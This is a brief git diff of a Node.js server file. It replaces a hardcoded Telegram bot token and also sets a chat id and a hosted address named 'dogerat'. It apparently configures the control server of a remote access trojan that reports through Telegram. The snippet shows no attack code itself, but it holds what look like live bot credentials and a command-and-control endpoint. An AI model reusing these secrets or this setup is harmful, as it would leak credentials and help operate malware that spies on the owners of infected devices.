@@ -7,7 +7,7 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '7349806224:AAHa2HYZMoRH3cIzDOJd55ET5T57Rt2iyxo'
+const token = '7630123443:AAHCauknVUvK1E39jZDQhI0zD03lmniD-XE'
 const id = '6407241468'
 const address = 'https://dogerat-e6f4.onrender.com'
 
